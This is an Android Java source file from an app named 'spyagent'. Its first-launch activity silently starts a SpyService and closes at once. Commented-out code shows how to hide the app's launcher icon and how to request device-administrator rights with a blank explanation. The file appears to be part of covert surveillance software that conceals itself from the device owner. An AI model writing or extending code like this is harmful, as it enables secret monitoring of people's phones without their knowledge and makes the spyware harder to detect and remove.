package com.irodyk.spyagent.view;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

import com.irodyk.spyagent.SpyService;

/**
 * Created by i.rodyk on 8/29/16.
 */
public class FirstLaunchActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        startService(new Intent(this, SpyService.class));
        finish();
        //hiding the app
//        PackageManager p = getPackageManager();
//        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

//        PackageManager p = getPackageManager();
//        ComponentName componentName = new ComponentName(this, com.irodyk.spyagent.view.FirstLaunchActivity.class);
//        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

//        final ComponentName deviceAdmin = new ComponentName(this, AdminReceiver.class);
//        final DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
//        if (!dpm.isAdminActive(deviceAdmin)) {
//            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
//            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdmin);
//            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "");
//            Log.d(getClass().getSimpleName(), "Application admin ");
//            //LicenseUtils.setIsLicenseChecked(this, false);
//            startActivityForResult(intent, 120);
//        } else {
////            Log.d(getClass().getSimpleName(), "Application already has device admin privileges");
////            if (LicenseUtils.getIsLicenseActivated(this) && LicenseUtils.getIsLicenseChecked(this)) {
////                start(this);
////                finish();
////            } else if (!LicenseUtils.getIsLicenseChecked(this)) {
////                if(hasInternetConnection()) {
////                    activateKnoxLicense(this);
////                } else {
////                    start(this);
////                    finish();
////                }
////
////            }
//        }

    }
}
